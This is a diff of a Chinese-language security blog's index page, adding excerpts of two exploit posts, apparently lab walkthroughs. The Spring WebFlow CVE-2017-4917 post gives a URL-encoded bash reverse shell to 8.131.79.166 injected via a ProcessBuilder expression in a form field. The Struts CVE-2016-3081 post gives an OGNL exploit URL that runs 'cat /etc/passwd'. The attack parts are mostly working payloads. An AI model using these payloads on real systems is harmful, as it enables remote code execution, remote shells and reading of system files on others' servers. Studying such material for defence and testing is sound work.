+                <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Spring WebFlow 在 Model 的数据绑定由于没有明确指定相关 model 的具体属性导致从表单可以提交恶意的表达式从而被执行，导致任意代码执行的漏洞。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring WebFlow 2.4.0 – 2.4.4</p>
+<h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><p>启动镜像，访问镜像地址<br>根据提示的用户名密码进行登陆<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>访问路径<code>hotels/1</code>，点击Book Hotel<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"><br>填好信息后点击Proceed<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"><br>点击confirm抓包<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"><br>将反弹shell的命令进行url转码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.131.79.166&#x2F;2345 0&gt;&amp;1	 &#x3D;&#x3D;&gt;%62%61%73%68%20%2d%69%3e%26%20%2f%64%65%76%2f%74%63%70%2f%38%2e%31%33%31%2e%37%39%2e%31%36%36%2f%32%33%34%35%20%30%3e%26%31</span><br></pre></td></tr></table></figure>
+<p>将POC填充到包里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_eventId_confirm&#x3D;&amp;_csrf&#x3D;33a3bc39-f5ef-4c73-a05e-8265c26c3cd3&amp;_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;%62%61%73%68%20%2d%69%3e%26%20%2f%64%65%76%2f%74%63%70%2f%38%2e%31%33%31%2e%37%39%2e%31%36%36%2f%32%33%34%35%20%30%3e%26%31&quot;)).start()&#x3D;vulhub</span><br></pre></td></tr></table></figure>
+<p>点击go，监听端即可返回shell<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2017-4917 Spring WebFlow远程代码执行漏洞">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/">
+    		CVE-2016-3081 Struts-032远程命令执行POC
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-20T11:30:56.000Z">2020-12-20</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/1.png"></p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/" title="CVE-2016-3081 Struts-032远程命令执行POC">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
 
     
     <nav class="page-navigator">
@@ -696,12 +684,12 @@
     
     <li>
         <a href="/categories/POC-EXP/">POC&amp;EXP</a>
-        <span class="badge">(7)</span>
+        <span class="badge">(8)</span>
     </li>
     
     <li>
         <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-        <span class="badge">(6)</span>
+        <span class="badge">(8)</span>
     </li>
     
 </ul>
@@ -763,7 +751,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1610800214408.js"></script>
+<script src="/js/main.js?v=1610800778183.js"></script>
 
 
 </body>
